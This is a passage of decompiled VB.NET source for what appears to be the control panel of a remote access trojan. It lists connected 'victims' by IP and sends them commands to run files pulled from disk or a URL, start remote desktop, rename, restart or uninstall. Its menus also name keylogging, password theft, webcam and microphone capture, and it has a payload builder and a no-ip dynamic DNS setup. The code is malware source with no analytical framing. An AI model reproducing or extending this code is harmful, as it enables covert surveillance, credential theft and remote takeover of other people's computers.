						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000257 RID: 599 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripStatusLabel5_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000258 RID: 600 RVA: 0x000181D0 File Offset: 0x000163D0
		Private Sub ManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Dim client As Client = CType(dataGridViewRow.Tag, Client)
					If client IsNot Nothing Then
						Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						If manager Is Nothing Then
							manager = New Manager() With { .sk = client, .Name = "m" + client.ip() }
							manager.Show()
						Else
							manager.WindowState = FormWindowState.Minimized
							manager.WindowState = FormWindowState.Normal
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000259 RID: 601 RVA: 0x000182AC File Offset: 0x000164AC
		Private Sub L1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs)
			If e.Column.Index = 0 Then
				If e.Column.Width > 250 Then
					e.Column.Width = 250
				End If
				If e.Column.Width < 35 Then
					e.Column.Width = 35
				End If
				Me.L1.method_7(CInt(Math.Round(Math.Round(CDbl(e.Column.Width) * 0.67))))
			End If
		End Sub

		' Token: 0x0600025A RID: 602 RVA: 0x00018338 File Offset: 0x00016538
		Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600025B RID: 603 RVA: 0x00018338 File Offset: 0x00016538
		Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600025C RID: 604 RVA: 0x0000273C File Offset: 0x0000093C
		Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Process.Start(Application.ExecutablePath)
			Me.Close()
		End Sub

		' Token: 0x0600025D RID: 605 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x0600025E RID: 606 RVA: 0x00018374 File Offset: 0x00016574
		Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "@"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x0600025F RID: 607 RVA: 0x000183DC File Offset: 0x000165DC
		Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "!"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x06000260 RID: 608 RVA: 0x00017DDC File Offset: 0x00015FDC
		Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x06000261 RID: 609 RVA: 0x00018444 File Offset: 0x00016644
		Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim furl As FURL = New FURL()
				furl.ShowDialog(Me)
				If furl.IsOK Then
					Dim text As String = String.Concat(New String() { "rn", Class7.string_1, furl.TextBox2.Text, Class7.string_1, furl.TextBox1.Text })
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { Class6.smethod_11(text), Color.Green })
				End If
			End If
		End Sub

		' Token: 0x06000262 RID: 610 RVA: 0x00018500 File Offset: 0x00016700
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
			If text.Length > 0 Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Try
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { String.Concat(New String() { "prof", Class7.string_1, "~", Class7.string_1, "vn", Class7.string_1, Class6.smethod_14(text) }) }, Nothing, Nothing, Nothing, True)
							dataGridViewRow.Cells(Class7.int_0).Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary).Length - 1)
						Catch ex As Exception
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000263 RID: 611 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000264 RID: 612 RVA: 0x000186C0 File Offset: 0x000168C0
		Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("sc2.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000265 RID: 613 RVA: 0x00018754 File Offset: 0x00016954
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.int_0 += 1
				If Me.int_0 = 10 Then
					Me.int_0 = 0
					Me.upl.Text = "Upload [" + Class6.smethod_17(Class7.long_0) + "]"
					Me.dwn.Text = "Download [" + Class6.smethod_17(Class7.long_1) + "]"
					Class7.long_0 = 0L
					Class7.long_1 = 0L
				End If
				Me.Text = String.Concat(New String() { Class7.string_0, "    Port[ ", Conversions.ToString(Me.port), " ]    Online[ ", Conversions.ToString(Me.L1.RowCount), " ]    Selected[", Conversions.ToString(Me.L1.SelectedRows.Count), "] REQ[", Conversions.ToString(Me.S.REQ.Count), "]" })
				Me.conz.Text = "Connections[" + Conversions.ToString(Me.S.Online.Count) + "]"
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000266 RID: 614 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000267 RID: 615 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ToolStripStatusLabel8_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000268 RID: 616 RVA: 0x0000274F File Offset: 0x0000094F
		Private Sub FlatButton1_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Builder.ShowDialog()
		End Sub

		' Token: 0x06000269 RID: 617 RVA: 0x00002761 File Offset: 0x00000961
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Mynoip.ShowDialog()
		End Sub

		' Token: 0x0600026A RID: 618 RVA: 0x00002773 File Offset: 0x00000973
		Private Sub FlatButton4_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Asemb.ShowDialog()
		End Sub

		' Token: 0x0600026B RID: 619 RVA: 0x000188D8 File Offset: 0x00016AD8
		Private Sub FlatButton3_Click(sender As Object, e As EventArgs)
			Dim stng As STNG = New STNG() With { .StartPosition = FormStartPosition.CenterParent }
			stng.ShowDialog()
		End Sub

		' Token: 0x0600026C RID: 620 RVA: 0x00002785 File Offset: 0x00000985
		Private Sub FlatButton5_Click(sender As Object, e As EventArgs)
			MyProject.Forms.About.ShowDialog()
		End Sub

		' Token: 0x040000CD RID: 205
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000CF RID: 207
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x040000D0 RID: 208
		<AccessedThroughProperty("ManagerToolStripMenuItem")>
		Private _ManagerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D1 RID: 209
		<AccessedThroughProperty("RunFileToolStripMenuItem")>
		Private _RunFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D2 RID: 210
		<AccessedThroughProperty("FromLinkToolStripMenuItem")>
		Private _FromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D3 RID: 211
		<AccessedThroughProperty("FromDiskToolStripMenuItem")>
		Private _FromDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D4 RID: 212
		<AccessedThroughProperty("ScriptToolStripMenuItem")>
		Private _ScriptToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D5 RID: 213
		<AccessedThroughProperty("RemoteDesktopToolStripMenuItem")>
		Private _RemoteDesktopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D6 RID: 214
		<AccessedThroughProperty("RemoteCamToolStripMenuItem")>
		Private _RemoteCamToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D7 RID: 215
		<AccessedThroughProperty("MicrophoneToolStripMenuItem")>
		Private _MicrophoneToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D8 RID: 216
		<AccessedThroughProperty("GetPasswordsToolStripMenuItem")>
		Private _GetPasswordsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D9 RID: 217
		<AccessedThroughProperty("KeyloggerToolStripMenuItem")>
		Private _KeyloggerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DA RID: 218
		<AccessedThroughProperty("OpenChatToolStripMenuItem")>
		Private _OpenChatToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DB RID: 219
		<AccessedThroughProperty("ServerToolStripMenuItem")>
		Private _ServerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DC RID: 220
		<AccessedThroughProperty("UpdateToolStripMenuItem")>
		Private _UpdateToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DD RID: 221
		<AccessedThroughProperty("FromDISKToolStripMenuItem1")>
		Private _FromDISKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000DE RID: 222
		<AccessedThroughProperty("FromLINKToolStripMenuItem1")>
		Private _FromLINKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000DF RID: 223
		<AccessedThroughProperty("UninstallToolStripMenuItem")>
		Private _UninstallToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E0 RID: 224
		<AccessedThroughProperty("RestartToolStripMenuItem")>
		Private _RestartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E1 RID: 225
		<AccessedThroughProperty("CloseToolStripMenuItem")>
		Private _CloseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E2 RID: 226
		<AccessedThroughProperty("DisconnectToolStripMenuItem")>
		Private _DisconnectToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E3 RID: 227
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E4 RID: 228
		<AccessedThroughProperty("OpenFolderToolStripMenuItem")>
		Private _OpenFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E5 RID: 229
		<AccessedThroughProperty("IMG2")>
		Private _IMG2 As ImageList

		' Token: 0x040000E6 RID: 230
		<AccessedThroughProperty("NotifyIcon1")>
		Private _NotifyIcon1 As NotifyIcon

		' Token: 0x040000E7 RID: 231
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x040000E8 RID: 232
		<AccessedThroughProperty("ShowToolStripMenuItem")>
		Private _ShowToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000E9 RID: 233
		<AccessedThroughProperty("RestartToolStripMenuItem1")>
		Private _RestartToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000EA RID: 234
		<AccessedThroughProperty("ExitToolStripMenuItem")>
		Private _ExitToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000EB RID: 235
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As System.Windows.Forms.Timer

		' Token: 0x040000EC RID: 236
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x040000ED RID: 237
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x040000EE RID: 238
		<AccessedThroughProperty("ToolStripStatusLabel1")>
		Private _ToolStripStatusLabel1 As ToolStripStatusLabel

		' Token: 0x040000EF RID: 239
		<AccessedThroughProperty("ToolStripStatusLabel3")>
		Private _ToolStripStatusLabel3 As ToolStripStatusLabel

		' Token: 0x040000F0 RID: 240
		<AccessedThroughProperty("ToolStripStatusLabel5")>
		Private _ToolStripStatusLabel5 As ToolStripStatusLabel

		' Token: 0x040000F1 RID: 241
		<AccessedThroughProperty("ToolStripStatusLabel2")>
		Private _ToolStripStatusLabel2 As ToolStripStatusLabel

		' Token: 0x040000F2 RID: 242
		<AccessedThroughProperty("ToolStripStatusLabel8")>
		Private _ToolStripStatusLabel8 As ToolStripStatusLabel

		' Token: 0x040000F3 RID: 243
		<AccessedThroughProperty("ToolStripStatusLabel4")>
		Private _ToolStripStatusLabel4 As ToolStripStatusLabel

		' Token: 0x040000F4 RID: 244
		<AccessedThroughProperty("conz")>
		Private _conz As ToolStripStatusLabel

		' Token: 0x040000F5 RID: 245
		<AccessedThroughProperty("upl")>
		Private _upl As ToolStripStatusLabel

		' Token: 0x040000F6 RID: 246
		<AccessedThroughProperty("dwn")>
		Private _dwn As ToolStripStatusLabel

		' Token: 0x040000F7 RID: 247
		<AccessedThroughProperty("ToolStripStatusLabel7")>
		Private _ToolStripStatusLabel7 As ToolStripStatusLabel

		' Token: 0x040000F8 RID: 248
		<AccessedThroughProperty("ToolStripStatusLabel6")>
		Private _ToolStripStatusLabel6 As ToolStripStatusLabel

		' Token: 0x040000F9 RID: 249
		<AccessedThroughProperty("FlatGroupBox1")>
		Private _FlatGroupBox1 As FlatGroupBox

		' Token: 0x040000FA RID: 250
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x040000FB RID: 251
		<AccessedThroughProperty("L1")>
		Private _L1 As L1

		' Token: 0x040000FC RID: 252
		<AccessedThroughProperty("Pp1")>
		Private _Pp1 As Pp1

		' Token: 0x040000FD RID: 253
		<AccessedThroughProperty("FlatButton5")>
		Private _FlatButton5 As FlatButton

		' Token: 0x040000FE RID: 254
		<AccessedThroughProperty("FlatButton3")>
		Private _FlatButton3 As FlatButton

		' Token: 0x040000FF RID: 255
		<AccessedThroughProperty("FlatButton4")>
		Private _FlatButton4 As FlatButton

		' Token: 0x04000100 RID: 256
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x04000101 RID: 257
		<AccessedThroughProperty("FlatClose1")>
		Private _FlatClose1 As FlatClose

		' Token: 0x04000102 RID: 258
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000103 RID: 259
		<AccessedThroughProperty("FlatButton1")>
		Private _FlatButton1 As FlatButton

		' Token: 0x04000104 RID: 260
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x04000105 RID: 261
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000106 RID: 262
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000107 RID: 263
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000108 RID: 264
		<AccessedThroughProperty("PictureBox5")>
		Private _PictureBox5 As PictureBox

		' Token: 0x04000109 RID: 265
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x0400010A RID: 266
		<AccessedThroughProperty("PictureBox3")>
		Private _PictureBox3 As PictureBox

		' Token: 0x0400010B RID: 267
		<AccessedThroughProperty("PictureBox2")>
		Private _PictureBox2 As PictureBox

		' Token: 0x0400010C RID: 268
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400010D RID: 269
		Private int_0 As Integer

		' Token: 0x0400010E RID: 270
		Public isActive As Boolean

		' Token: 0x0400010F RID: 271
		Public port As Integer

		' Token: 0x04000110 RID: 272
		Public S As SK
	End Class
End Namespace
